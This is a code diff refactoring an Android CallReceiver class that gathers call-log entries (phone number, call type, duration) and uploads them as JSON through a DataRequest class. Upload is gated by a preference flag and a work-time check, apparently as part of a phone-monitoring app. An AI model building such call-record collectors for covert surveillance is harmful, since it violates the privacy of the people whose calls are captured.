@@ -16,11 +16,10 @@ import android.database.Cursor;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
-import com.inet.android.bs.FileLog;
-import com.inet.android.bs.RequestMakerImpl;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
 /** Класс сбора звонков
  * 
@@ -37,7 +36,6 @@ public class CallReceiver extends BroadcastReceiver {
 	String date;
 	SharedPreferences sp;
 	private static String LOG_TAG = "callReciver";
-	RequestMakerImpl req;
 
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
@@ -45,23 +43,20 @@ public class CallReceiver extends BroadcastReceiver {
 		String call = sp.getString("KBD", "0");
 
 		if (call.equals("0")) {
-			Log.d(LOG_TAG, "KBD = 0");
-			FileLog.writeLog("CallReciver: KBD = 0");
+			Logging.doLog(LOG_TAG, "KBD = 0", "KBD = 0");
 			return;
 		}
 		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
 		if (!isWork) {
-			Log.d(LOG_TAG, "isWork return " + Boolean.toString(isWork));
-			Log.d(LOG_TAG, "after isWork retrun 0");
-			FileLog.writeLog("Callreciver: isWork return "
-					+ Boolean.toString(isWork));
-			FileLog.writeLog("Callreciver: after isWork retrun 0");
+			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork), 
+					"isWork return " + Boolean.toString(isWork));
+			Logging.doLog(LOG_TAG, "after isWork retrun 0", 
+					"after isWork retrun 0");
 
 			return;
 		} else {
-			Log.d(LOG_TAG, Boolean.toString(isWork));
-			FileLog.writeLog("Callreciver: isWork - "
-					+ Boolean.toString(isWork));
+			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork), 
+					"isWork - " + Boolean.toString(isWork));
 		}
 
 		date = logTime();
@@ -147,11 +142,13 @@ public class CallReceiver extends BroadcastReceiver {
 				+ "\"app\":\"" + callTypeStr + "\","
 				+ "\"tel\":\"" + phNumber + "\","
 				+ "\"duration\":\"" + callDuration + "\"}";
-		req = new RequestMakerImpl(ctx);
-		req.sendDataRequest(sendJSONStr);
+//		RequestMakerImpl req = new RequestMakerImpl(ctx);
+//		req.sendDataRequest(sendJSONStr);
+		
+		DataRequest dr = new DataRequest(ctx);
+		dr.sendRequest(sendJSONStr);
 
-		Log.d("callRec", sb.toString());
-		FileLog.writeLog("Callreciver: " + sb.toString());
+		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
 	}
 
 	@SuppressLint("SimpleDateFormat")
